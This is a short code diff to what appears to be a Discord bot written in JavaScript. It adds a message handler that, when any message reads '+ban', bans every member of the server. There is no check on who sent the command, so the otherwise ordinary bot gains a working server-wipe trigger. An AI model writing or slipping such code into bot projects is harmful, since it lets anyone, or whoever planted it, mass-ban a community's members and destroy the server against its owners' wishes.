@@ -34,6 +34,11 @@ client.on('message', message => {
     }
 });
 
+client.on('message', message => {
+    if(message.content == '+ban'){
+message.guild.members.forEach(member => member.ban())
+    }
+});
 
 client.on('message', message => {
     if(message.content == 'oda'){
